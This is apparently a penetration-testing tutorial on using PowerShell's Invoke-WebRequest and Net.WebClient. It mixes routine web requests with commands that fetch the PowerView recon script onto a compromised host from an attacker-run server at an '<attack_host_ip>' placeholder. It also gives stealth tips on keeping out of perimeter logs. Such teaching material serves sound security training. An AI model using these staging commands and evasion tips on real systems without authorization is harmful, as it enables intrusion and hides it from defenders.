## Interacting With the Web Using PowerShell

PowerShell is a powerful tool not only for managing systems but also for interacting with web resources—both on the Internet and within internal networks. As system administrators, we can automate software updates, application installations, and configurations across local and remote systems—without relying on graphical interfaces or manual downloads. This saves time and allows us to administer systems remotely, without having to use RDP or sit in front of the machine.

For penetration testers, PowerShell also provides a fast and efficient way to bring tools into an environment and exfiltrate data, assuming an infrastructure is in place to receive it. In this section, we'll explore several ways to use PowerShell to interact with web content, with a primary focus on the `Invoke-WebRequest` cmdlet.

## How PowerShell Interacts With the Web

PowerShell’s primary tool for web interaction is the `Invoke-WebRequest` cmdlet. This cmdlet allows you to:

- Make HTTP and HTTPS requests (GET, POST, etc.)
    
- Download files
    
- Parse HTML content (forms, links, images, etc.)
    
- Authenticate with websites
    
- Maintain session state
    

### Aliases

- `Invoke-WebRequest` is aliased to `iwr`, `wget`, and `curl`—useful for those familiar with Linux CLI tools like `wget` and `curl`.

To see the available parameters and capabilities:

`Get-Help Invoke-WebRequest`

## Example: Basic Web Request

You can perform a basic GET request using:

`Invoke-WebRequest -Uri "https://example.com/page.html" -Method GET`

To inspect the object returned:

`Invoke-WebRequest -Uri "https://example.com/page.html" | Get-Member`

This returns a rich object containing various properties like:

- `.Content` – The page’s HTML content
    
- `.Headers` – HTTP headers
    
- `.Images`, `.Links`, `.Forms` – Parsed HTML elements
    
- `.StatusCode` – HTTP status (e.g., 200 OK)
    

* * *

## Filtering Specific Data

You can extract specific parts of the response object. For example, to list only the images on a page:

`(Invoke-WebRequest -Uri "https://example.com/page.html").Images`

Or to view the raw HTML content:

`(Invoke-WebRequest -Uri "https://example.com/page.html").RawContent`

This is useful for extracting data like names, emails, links, or other recon-worthy information.

## Downloading Files With PowerShell

Whether for administration, red teaming, or recovery, downloading files is a common task. `Invoke-WebRequest` makes this easy.

### Example: Download PowerView.ps1

`Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1"`

This downloads the file to `C:\PowerView.ps1`. You can use this same method to pull files from internal web servers, reducing the chances of detection during a pentest.

## Hosting Tools Locally for Download

During engagements, it’s often useful to host files on your own attack machine and have the compromised host download them.

### 1\. On the Attack Machine:

Ensure the file exists:

`ls | grep PowerView.ps1`

Start a Python HTTP server:

`python3 -m http.server 8000`

### 2\. On the Target (Windows) Machine:

Download the file using PowerShell:

`Invoke-WebRequest -Uri "http://<attack_host_ip>:8000/PowerView.ps1" -OutFile "C:\PowerView.ps1"`

This avoids external traffic and keeps activity within the internal network.

* * *

## If `Invoke-WebRequest` is Disabled

In some environments, `Invoke-WebRequest` may be restricted. An alternative is using the .NET `WebClient` class.

### Example:

`(New-Object Net.WebClient).DownloadFile("https://example.com/tool.zip", "C:\tool.zip")`

This approach works similarly:

- The first argument is the URL.
    
- The second is the local file path for saving.
    

You can use this to quietly retrieve files even when PowerShell cmdlets are locked down—though this is still noisy from a logging perspective.

## Final Notes

While we've just scratched the surface, PowerShell offers numerous ways to interact with web resources. Whether for administration or offensive security tasks, tools like `Invoke-WebRequest` and `.Net.WebClient` make web interactions scriptable and efficient.

Just remember:

- Internal transfers reduce perimeter logs and increase stealth.
    
- Web interactions (especially downloads) will often leave traces in system and firewall logs.
    
- Know your alternatives and use them appropriately depending on your goal and context.
